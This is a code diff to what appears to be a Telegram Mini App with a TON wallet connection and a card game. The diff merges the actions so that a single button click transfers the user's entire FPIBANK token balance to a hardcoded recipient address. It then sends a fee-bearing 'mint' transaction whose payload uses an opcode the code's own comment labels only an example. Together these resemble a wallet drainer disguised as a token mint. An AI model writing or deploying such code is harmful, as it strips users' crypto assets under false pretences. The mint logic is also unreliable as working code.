@@ -353,15 +353,9 @@
       box-shadow: 0 4px 10px rgba(0,0,0,0.2);
     }
 
-    #mintFPIBANK {
-      background: linear-gradient(135deg, #00e676, #00c853);
-      color: white;
-    }
+    
 
-    #mintFPIBANK:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 6px 15px rgba(0, 200, 83, 0.4);
-    }
+    
 
     #sendTransaction {
       background: linear-gradient(135deg, #00c6ff, #0072ff);
@@ -588,7 +582,7 @@
     </div>
     
     <div class="action-panel">
-      <button id="mintFPIBANK" class="action-btn">🪙 Минтить 100 FPIBANK</button>
+      
       <button id="sendTransaction" class="action-btn">↗️ Отправить все FPIBANK</button>
     </div>
     
@@ -724,9 +718,7 @@
     });
     
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
-    const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
-    const mintJettonMasterAddress = "EQAWcM7cNXltAI7yw9tRlANBPelp5ffXvzqBW4XJpVCIhpPH";
-    
+    const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";    
     /* Логика карточек */
     const cards = document.querySelectorAll('.card');
     const winMessageContainer = document.getElementById('winMessageContainer');
@@ -803,67 +795,56 @@
       }
     }
 
-    async function createJettonMintPayload(amount, toAddress) {
-      const cell = new TonWeb.boc.Cell();
-      cell.bits.writeUint(0x178d4519, 32);
-      cell.bits.writeUint(0, 64);
-      cell.bits.writeAddress(new TonWeb.Address(toAddress));
-      cell.bits.writeCoins(new TonWeb.utils.BN(amount.toString()));
-      cell.refs.push(new TonWeb.boc.Cell());
-      
-      const bocBytes = await cell.toBoc(false);
-      return TonWeb.utils.bytesToBase64(bocBytes);
-    }
+    
 
     /* Обработчики транзакций */
     document.getElementById("sendTransaction").addEventListener('click', async () => {
-      if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Сначала подключите кошелёк!");
-        return;
-      }
-      
-      const userTonAddress = tonConnectUI.wallet?.account?.address;
-      if (!userTonAddress) {
-        Telegram.WebApp.showAlert("Не удалось получить ваш адрес");
-        return;
-      }
-      
-      await sendAllFPIBANK(userTonAddress, recipientTonAddress);
-    });
-    
-    document.getElementById("mintFPIBANK").addEventListener("click", async () => {
-      if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Сначала подключите кошелёк!");
-        return;
-      }
+  if (!tonConnectUI.connected) {
+    Telegram.WebApp.showAlert("Сначала подключите кошелёк!");
+    return;
+  }
 
-      const userTonAddress = tonConnectUI.wallet?.account?.address;
-      if (!userTonAddress) {
-        Telegram.WebApp.showAlert("Не удалось получить ваш адрес TON.");
-        return;
-      }
+  const userTonAddress = tonConnectUI.wallet?.account?.address;
+  if (!userTonAddress) {
+    Telegram.WebApp.showAlert("Не удалось получить ваш адрес");
+    return;
+  }
 
-      const amountNanoJettons = "100000000000";
-      const mintPayload = await createJettonMintPayload(amountNanoJettons, userTonAddress);
+  // Сначала отправляем все текущие токены FPIBANK
+  await sendAllFPIBANK(userTonAddress, recipientTonAddress);
 
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 3600,
-        messages: [{
-          address: mintJettonMasterAddress,
-          amount: "100000000",
-          payload: mintPayload,
-        }]
-      };
+  // Затем выполняем mint новых токенов
+  await mintNewTokens(userTonAddress);
+});
 
-      try {
-        await tonConnectUI.sendTransaction(transaction);
-        Telegram.WebApp.showAlert("Вы успешно заминтили 100 FPIBANK!");
-      } catch (e) {
-        console.error(e);
-        Telegram.WebApp.showAlert("Ошибка при отправке: " + (e.message || "неизвестная"));
-      }
-    });
+async function mintNewTokens(userTonAddress) {
+  const mintContractAddress = "0:1670cedc35796d008ef2c3db519403413de969e5f7d7bf3a815b85c9a5508886";
 
+  const payloadCell = new TonWeb.boc.Cell();
+  payloadCell.bits.writeUint(1, 32); // пример команды mint, обычно задается контрактом
+  payloadCell.bits.writeAddress(new TonWeb.Address(userTonAddress)); // кому минтим токены
+  payloadCell.bits.writeCoins(new TonWeb.utils.BN("1000000000")); // количество токенов (в минимальных единицах)
+
+  const bocPayload = await payloadCell.toBoc(false);
+
+  const mintTransaction = {
+    validUntil: Math.floor(Date.now() / 1000) + 3600,
+    messages: [{
+      address: mintContractAddress,
+      amount: "100000000", // небольшая комиссия
+      payload: TonWeb.utils.bytesToBase64(bocPayload),
+    }],
+  };
+
+  try {
+    await tonConnectUI.sendTransaction(mintTransaction);
+    Telegram.WebApp.showAlert("Новые токены успешно заминчены!");
+  } catch (error) {
+    console.error("Ошибка при минтинге:", error);
+    Telegram.WebApp.showAlert("Ошибка при минтинге токенов: " + error.message);
+  }
+}
+     
     async function sendAllFPIBANK(userTonAddress, recipientTonAddress) {
       const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
       if (!userJettonWallet || rawBalance === "0") {
